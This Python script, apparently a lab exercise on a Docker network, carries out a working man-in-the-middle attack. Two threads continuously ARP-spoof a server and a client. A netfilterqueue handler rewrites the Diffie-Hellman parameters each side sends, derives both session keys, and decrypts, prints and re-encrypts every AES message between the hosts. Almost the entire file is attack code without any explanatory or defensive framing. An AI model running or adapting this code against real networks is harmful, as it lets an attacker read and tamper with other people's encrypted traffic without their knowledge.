from scapy.all import *
import threading
import netfilterqueue
import json
from Crypto.Util.number import getPrime, getRandomInteger
from aes import aes_decrypt, aes_encrypt

# iptables设置规则iptables -A FORWARD -j NFQUEUE --queue-num 0


def primitive_root(p: int) -> int:
    """求素数p的最小原根"""
    k = (p - 1) // 2
    for i in range(2, p - 1):
        if pow(i, k, p) != 1:
            return i
    return -1


def key_format(K: int) -> bytes:
    K = str(K)  # 先将K转化为字符
    K = K[0: 32]  # 取前32位字符
    K = K.encode()  # 转变为bytes类型
    return K


def arp_spoof(hwdst: str, pdst: str, hwsrc: str, psrc: str, inter: int = 0.1) -> None:
    eth = Ether()
    arp = ARP(
        op='is-at',

        hwsrc=hwsrc,
        psrc=psrc,

        hwdst=hwdst,
        pdst=pdst
    )

    pkt = eth/arp

    sendp(pkt, iface='eth0', loop=1, inter=inter)


# def capture():
#     sniff(
#         prn=callback,
#         store=False,
#         filter=f'((src host {SERVER_IP}) or (src host {CLIENT_IP})) and tcp',
#         iface='eth0'
#     )


# def callback(packet) -> None:

#     ip_packet = packet[IP]
#     tcp_packet = packet[TCP]

#     # print(ether_packet.show())
#     # print(ip_packet.show())
#     # print(tcp_packet.show())

#     if ip_packet.src == CLIENT_IP and ip_packet.dst == SERVER_IP and tcp_packet.flags == 'S':
#         packet[Ether].dst = SERVER_MAC
#         del packet[IP].len
#         del packet[IP].chksum
#         del packet[TCP].chksum
#         sendp(packet, iface='eth0')
#         return

#     if ip_packet.src == SERVER_IP and ip_packet.dst == CLIENT_IP and tcp_packet.flags == 'SA':
#         packet[Ether].dst = CLIENT_MAC
#         del packet[IP].len
#         del packet[IP].chksum
#         del packet[TCP].chksum
#         sendp(packet, iface='eth0')
#         return

#     print(raw(tcp_packet))

#     # if ip_packet.src == CLIENT_IP and ip_packet.dst == SERVER_IP and tcp_packet.flags == 'A':
#     #     print()
#     #     print('ACK')

#     # print(packet.show())

def packet_handler(packet) -> None:
    global g_server
    global p_server
    global A_server
    global B_middle_server
    global K_middle_server
    global K_middle_client
    global B_client

    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(TCP) and scapy_packet[TCP].flags != 'A':
        if scapy_packet[IP].src == CLIENT_IP and scapy_packet[IP].dst == SERVER_IP and scapy_packet.haslayer(Raw):
            try:
                msg = json.loads(scapy_packet[Raw].load.decode())
            except Exception:
                return

            if msg['status'] == 2:
                B_client = msg['body']['B']
                K_middle_client = pow(
                    B_client, a_middle_client, p_middle_client)

                hacked_msg = {
                    "status": 2,
                    "body": {
                        "B": B_middle_server
                    }
                }

                scapy_packet[Raw] = Raw(json.dumps(hacked_msg))

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                packet.set_payload(bytes(scapy_packet))

                print(f'\nK_middle_client: {K_middle_client}')

                K_middle_client = key_format(K_middle_client)

            elif msg['status'] == 3:
                cipher = msg['body']['msg'].encode()
                plaintext = aes_decrypt(cipher, K_middle_client).decode()
                print(f'\nfrom client: {plaintext}')

                hacked_cipher = aes_encrypt(
                    plaintext.encode(), K_middle_server)
                hacked_msg = {
                    "status": 3,
                    "body": {
                        "msg": hacked_cipher.decode()
                    }
                }

                scapy_packet[Raw] = Raw(json.dumps(hacked_msg))

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                packet.set_payload(bytes(scapy_packet))

        elif scapy_packet[IP].src == SERVER_IP and scapy_packet[IP].dst == CLIENT_IP and scapy_packet.haslayer(Raw):
            try:
                msg = json.loads(scapy_packet[Raw].load.decode())
            except:
                return

            if msg['status'] == 1:
                g_server = msg['body']['g']
                p_server = msg['body']['p']
                A_server = msg['body']['A']
                B_middle_server = pow(g_server, b_middle_server, p_server)
                K_middle_server = pow(A_server, b_middle_server, p_server)

                hacked_msg = {
                    "status": 1,
                    "body": {
                        "p": p_middle_client,
                        "g": g_middle_client,
                        "A": A_middle_client
                    }
                }

                scapy_packet[Raw] = Raw(json.dumps(hacked_msg))

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                packet.set_payload(bytes(scapy_packet))

                print(f'\nK_middle_server: {K_middle_server}')

                K_middle_server = key_format(K_middle_server)

            elif msg['status'] == 3:
                cipher = msg['body']['msg'].encode()
                plaintext = aes_decrypt(cipher, K_middle_server).decode()
                print(f'\nfrom server: {plaintext}')

                hacked_cipher = aes_encrypt(
                    plaintext.encode(), K_middle_client)
                hacked_msg = {
                    "status": 3,
                    "body": {
                        "msg": hacked_cipher.decode()
                    }
                }

                scapy_packet[Raw] = Raw(json.dumps(hacked_msg))

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                packet.set_payload(bytes(scapy_packet))

    packet.accept()


ATTACKER_MAC = '02:42:ac:11:00:02'
ATTACKER_IP = '172.17.0.2'

GATEWAY_IP = '172.17.0.1'

SERVER_MAC = '02:42:ac:11:00:03'
SERVER_IP = '172.17.0.3'

CLIENT_MAC = '02:42:ac:11:00:04'
CLIENT_IP = '172.17.0.4'

g_server = -1
p_server = -1
A_server = -1

b_middle_server = getRandomInteger(100)
B_middle_server = -1
K_middle_server = -1

a_middle_client = getRandomInteger(100)
p_middle_client = getPrime(300)
g_middle_client = primitive_root(p_middle_client)
A_middle_client = pow(g_middle_client, a_middle_client, p_middle_client)
K_middle_client = -1

B_client = -1

if __name__ == '__main__':
    server_arp_spoof_thread = threading.Thread(
        target=arp_spoof,
        args=(
            SERVER_MAC,
            SERVER_IP,
            ATTACKER_MAC,
            CLIENT_IP,
            0.1
        )
    )
    client_arp_spoof_thread = threading.Thread(
        target=arp_spoof,
        args=(
            CLIENT_MAC,
            CLIENT_IP,
            ATTACKER_MAC,
            SERVER_IP,
            0.1
        )
    )
    server_arp_spoof_thread.start()
    client_arp_spoof_thread.start()
    # capture_thread = threading.Thread(
    #     target=capture
    # )

    nf_queue = netfilterqueue.NetfilterQueue()
    nf_queue.bind(0, packet_handler)
    nf_queue_thread = threading.Thread(
        target=nf_queue.run
    )

    # capture_thread.start()

    time.sleep(5)
    print('\nstart capture')
    nf_queue_thread.start()
